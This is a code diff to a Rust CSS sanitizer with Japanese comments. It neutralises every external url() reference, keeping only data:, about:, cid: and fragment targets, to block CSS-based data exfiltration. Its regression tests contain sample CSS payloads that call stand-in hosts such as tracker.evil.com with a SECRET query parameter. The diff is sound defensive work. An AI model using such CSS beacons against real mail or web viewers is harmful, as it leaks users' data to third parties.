@@ -120,9 +120,30 @@ pub fn sanitize_style_attribute(value: &str) -> (String, bool) {
     (rewritten, count > 0)
 }
 
-/// `url(http://...)` / `url(https://...)` を `url(about:blank)` に置換する。
+/// `url(...)` の参照先がネットワークフェッチを起こさない安全な参照か判定する。
+///
+/// 保持する (安全) のは、インライン/ローカル参照のみ:
+/// - `data:` (インラインデータ、ネットワーク不要)
+/// - `about:` (`about:blank` 等)
+/// - `cid:` (メール埋め込み添付への参照)
+/// - `#` で始まるフラグメント参照 (SVG フィルタ等の同一文書内参照)
+/// - 空文字列
+///
+/// これ以外 (http(s)、プロトコル相対 `//host`、`ftp:`/`blob:` 等の任意スキーム、
+/// 裸ホスト `evil.com/x` 等) はすべて外部フェッチを起こし得るため中和する。
+/// 引数は小文字化・トリム・クォート除去済みの inner を想定。
+fn is_safe_css_url_target(inner_lower: &str) -> bool {
+    inner_lower.is_empty()
+        || inner_lower.starts_with("data:")
+        || inner_lower.starts_with("about:")
+        || inner_lower.starts_with("cid:")
+        || inner_lower.starts_with('#')
+}
+
+/// `url(...)` のうち外部フェッチを起こし得るものを `url(about:blank)` に置換する。
 ///
 /// 大文字小文字を無視し、シングル/ダブルクォートあり/なしを全パターン対応。
+/// 安全な参照 (`data:`/`about:`/`cid:`/`#`/空) は保持する。
 /// 戻り値: (置換後文字列, 置換件数)
 fn rewrite_external_urls(css: &str) -> (String, usize) {
     let mut result = String::with_capacity(css.len());
@@ -146,7 +167,12 @@ fn rewrite_external_urls(css: &str) -> (String, usize) {
                 if let Some(end) = css[start..].find(')') {
                     let inner = css[start..start + end].trim().trim_matches(|c| c == '\'' || c == '"');
                     let inner_lower = inner.to_ascii_lowercase();
-                    if inner_lower.starts_with("http://") || inner_lower.starts_with("https://") {
+                    // 外部フェッチを起こし得る参照はすべて中和する (安全性最優先)。
+                    // 以前は http:// / https:// のリテラル prefix のみ判定しており、
+                    // プロトコル相対 URL (url(//tracker.evil/pixel)) や ftp: 等の
+                    // 別スキーム、裸ホスト (url(evil.com/x)) がすり抜けて
+                    // 表示時に自動フェッチされ得た (CSS Blind Exfiltration)。
+                    if !is_safe_css_url_target(&inner_lower) {
                         result.push_str("url(about:blank)");
                         i = start + end + 1;
                         count += 1;
@@ -237,6 +263,52 @@ mod tests {
         let result = sanitize_css(css);
         assert!(!result.sanitized.contains("evil.com"));
         assert!(result.sanitized.contains("about:blank"));
+    }
+
+    #[test]
+    fn protocol_relative_url_rewritten() {
+        // 回帰: プロトコル相対 URL (//host) は http/https prefix に一致しないため
+        // 以前は素通りしていた。表示時に https で解決され自動フェッチされる。
+        let css = "body { background-image: url(//tracker.evil.com/pixel?d=SECRET); }";
+        let result = sanitize_css(css);
+        assert!(!result.sanitized.contains("tracker.evil.com"),
+            "プロトコル相対 URL が中和されていない: {}", result.sanitized);
+        assert!(result.sanitized.contains("about:blank"));
+        assert_eq!(result.removed_count, 1);
+    }
+
+    #[test]
+    fn non_http_scheme_url_rewritten() {
+        // ftp: 等 http(s) 以外のスキームも外部フェッチを起こし得る
+        let css = "div { background: url(ftp://evil.com/x); }";
+        let result = sanitize_css(css);
+        assert!(!result.sanitized.contains("evil.com"),
+            "ftp: スキームが中和されていない: {}", result.sanitized);
+        assert!(result.sanitized.contains("about:blank"));
+    }
+
+    #[test]
+    fn bare_host_url_rewritten() {
+        // スキームなしの裸ホストも相対解決で外部フェッチになり得る
+        let css = "div { background: url(evil.com/track.png); }";
+        let result = sanitize_css(css);
+        assert!(!result.sanitized.contains("evil.com"),
+            "裸ホスト URL が中和されていない: {}", result.sanitized);
+        assert!(result.sanitized.contains("about:blank"));
+    }
+
+    #[test]
+    fn cid_and_fragment_urls_preserved() {
+        // メール埋め込み添付 (cid:) と同一文書内フラグメント (#) は保持
+        let css1 = "body { background: url(cid:logo123); }";
+        let r1 = sanitize_css(css1);
+        assert!(r1.sanitized.contains("cid:logo123"), "cid: は保持されるべき");
+        assert_eq!(r1.removed_count, 0);
+
+        let css2 = "rect { filter: url(#blur); }";
+        let r2 = sanitize_css(css2);
+        assert!(r2.sanitized.contains("url(#blur)"), "フラグメント参照は保持されるべき");
+        assert_eq!(r2.removed_count, 0);
     }
 
     #[test]
